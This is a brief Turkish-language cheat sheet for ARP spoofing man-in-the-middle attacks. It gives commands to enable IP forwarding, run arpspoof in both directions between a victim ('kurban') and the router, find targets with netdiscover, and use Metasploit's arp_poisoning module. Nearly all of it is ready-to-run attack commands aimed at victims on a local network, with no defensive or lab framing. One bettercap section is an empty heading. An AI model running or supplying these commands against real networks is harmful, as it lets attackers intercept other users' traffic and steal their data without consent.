# Arpspoof manual

```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
```

Her pc açıldığında bu komutu çalıştır.

```bash
arpspoof -it eth0 -t <kurban-id> <modem-id> 

arpspoof -it eth0 -t <modem-id> <kurban-id> 
```

Bu iki komut aynı anda çalıştırılmalı

idleri netdiscover ile al.

# Arpspoof w/ bettercap

# Arpspoof w/ msfconsole
```bash
msfconsole
msfconsole > use auxiliary/spoof/arp/arp_poisoning
search
show targets
show options
set rhosts 192.168.3.102 <target-ip>
exploit -j -z
sessions -l
sessions 1
exit
```